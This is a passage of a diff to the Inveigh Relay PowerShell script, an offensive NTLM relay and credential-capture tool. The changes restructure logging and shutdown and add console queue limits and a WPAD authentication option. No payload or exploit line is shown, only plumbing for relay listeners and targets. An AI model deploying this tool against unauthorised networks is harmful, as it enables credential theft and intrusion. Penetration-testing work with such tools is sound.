+    param ($ConsoleQueueLimit,$RelayAutoExit,$RunTime)
 
     function StopInveigh
     {
@@ -3215,44 +3563,57 @@ $control_relay_scriptblock =
             catch
             {
                 $inveigh.console_queue.Add("SSL Certificate Deletion Error - Remove Manually")
-                $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
 
                 if($inveigh.file_output)
                 {
-                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
+                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
+                }
+
+                if($inveigh.log_output)
+                {
+                    $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
                 }
 
             }
 
         }
-
-        if($inveigh.running)
-        {
-            Start-Sleep -S 1
-            $inveigh.console_queue.Add("Inveigh exited at $(Get-Date -format 's')")
-            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited due to $exit_message")  > $null
-            Start-Sleep -S 1
-            $inveigh.running = $false
-
-            if($inveigh.file_output)
-            {
-                "$(Get-Date -format 's') - Inveigh exited due to $exit_message" | Out-File $Inveigh.log_out_file -Append
-            }
-
-        }
-
+        
         Start-Sleep -S 1
-        $inveigh.console_queue.Add("Inveigh Relay exited due to $exit_message at $(Get-Date -format 's')")
-        $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message")  > $null
-        Start-Sleep -S 1
-        $inveigh.relay_running = $false
+        $inveigh.console_queue.Add("Inveigh exited at $(Get-Date -format 's')")
 
         if($inveigh.file_output)
         {
-            "$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message" | Out-File $Inveigh.log_out_file -Append
+            $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh exited due to $exit_message")
         }
 
-        $inveigh.HTTP = $false
+        if($inveigh.log_output)
+        {
+            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited due to $exit_message")
+        }
+
+        Start-Sleep -S 1
+        $inveigh.running = $false
+
+        if($inveigh.relay_running)
+        {
+            Start-Sleep -S 1
+            $inveigh.console_queue.Add("Inveigh Relay exited due to $exit_message at $(Get-Date -format 's')")
+
+            if($inveigh.file_output)
+            {
+                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message")
+            }
+
+            if($inveigh.log_output)
+            {
+                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited due to $exit_message")
+            }
+
+            Start-Sleep -S 1
+            $inveigh.relay_running = $false
+
+        } 
+
         $inveigh.HTTPS = $false
     }
 
@@ -3316,12 +3677,22 @@ $control_relay_scriptblock =
         
         }
 
+        if(!$inveigh.console_output -and $ConsoleQueueLimit -ge 0)
+        {
+
+            while($inveigh.console_queue.Count -gt $ConsoleQueueLimit -and !$inveigh.console_output)
+            {
+                $inveigh.console_queue.RemoveAt(0)
+            }
+
+        }
+
         Start-Sleep -m 5
     }
 
  }
 
-# HTTP Listener Startup function 
+# HTTP Listener Startup Function 
 function HTTPListener()
 {
     $HTTPS_listener = $false
@@ -3340,13 +3711,14 @@ function HTTPListener()
     $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
         $HTTPIP).AddArgument($HTTPPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
         $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
-        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
+        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
+        $WPADResponse) > $null
     $HTTP_powershell.BeginInvoke() > $null
 }
 
 Start-Sleep -m 50
 
-# HTTPS Listener Startup function 
+# HTTPS Listener Startup Function 
 function HTTPSListener()
 {
     $HTTPS_listener = $true
@@ -3365,13 +3737,14 @@ function HTTPSListener()
     $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
         $HTTPIP).AddArgument($HTTPSPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
         $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
-        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
+        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
+        $WPADResponse) > $null
     $HTTPS_powershell.BeginInvoke() > $null
 }
 
 Start-Sleep -m 50
 
-# Proxy Listener Startup function 
+# Proxy Listener Startup Function 
 function ProxyListener()
 {
     $HTTPS_listener = $false
@@ -3390,11 +3763,12 @@ function ProxyListener()
     $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
         $ProxyIP).AddArgument($ProxyPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
         $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
-        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
+        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
+        $WPADResponse) > $null
     $proxy_powershell.BeginInvoke() > $null
 }
 
-# Control Relay Startup function
+# Control Relay Startup Function
 function ControlRelayLoop()
 {
     $control_relay_runspace = [RunspaceFactory]::CreateRunspace()
@@ -3403,8 +3777,8 @@ function ControlRelayLoop()
     $control_relay_powershell = [PowerShell]::Create()
     $control_relay_powershell.Runspace = $control_relay_runspace
     $control_relay_powershell.AddScript($shared_basic_functions_scriptblock) > $null
-    $control_relay_powershell.AddScript($control_relay_scriptblock).AddArgument($RelayAutoExit).AddArgument(
-        $RunTime) > $null
+    $control_relay_powershell.AddScript($control_relay_scriptblock).AddArgument($ConsoleQueueLimit).AddArgument(
+        $RelayAutoExit).AddArgument($RunTime) > $null
     $control_relay_powershell.BeginInvoke() > $null
 }
 
@@ -3427,11 +3801,12 @@ if($Proxy -eq 'Y')
 }
 
 # Control Relay Loop Start
-if($RelayAutoExit -or $RunTime -or $inveigh.file_output)
+if($ConsoleQueueLimit -ge 0 -or $inveigh.file_output -or $RelayAutoExit -or $RunTime)
 {
     ControlRelayLoop
 }
 
+# Console Output Loop
 if($inveigh.console_output)
 {
 
@@ -3635,11 +4010,15 @@ if($inveigh)
             catch
             {
                 Write-Output("SSL Certificate Deletion Error - Remove Manually")
-                $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
 
                 if($inveigh.file_output)
                 {
                     "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
+                }
+
+                if($inveigh.log_output)
+                {
+                    $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null
                 }
 
             }
@@ -3648,31 +4027,40 @@ if($inveigh)
             
         if($inveigh.relay_running)
         {
-            $inveigh.relay_running = $false
-            Write-Output("Inveigh Relay exited at $(Get-Date -format 's')")
-            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited")  > $null
 
             if($inveigh.file_output)
             {
                 "$(Get-Date -format 's') - Inveigh Relay exited" | Out-File $Inveigh.log_out_file -Append
             }
 
+            if($inveigh.log_output)
+            {
+                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited")  > $null
+            }
+
+            Write-Output("Inveigh Relay exited at $(Get-Date -format 's')")
+            $inveigh.relay_running = $false
+
         } 
 
         if($inveigh.running)
         {
-            $inveigh.running = $false
-            Write-Output("Inveigh exited at $(Get-Date -format 's')")
-            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited")  > $null
 
             if($inveigh.file_output)
             {
                 "$(Get-Date -format 's') - Inveigh exited" | Out-File $Inveigh.log_out_file -Append
             }
 
+            if($inveigh.log_output)
+            {
+                $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited")  > $null
+            }
+
+            Write-Output("Inveigh exited at $(Get-Date -format 's')")
+            $inveigh.running = $false
+            
         }
 
-        $inveigh.HTTP = $false
         $inveigh.HTTPS = $false
         Start-Sleep -S 5
     }
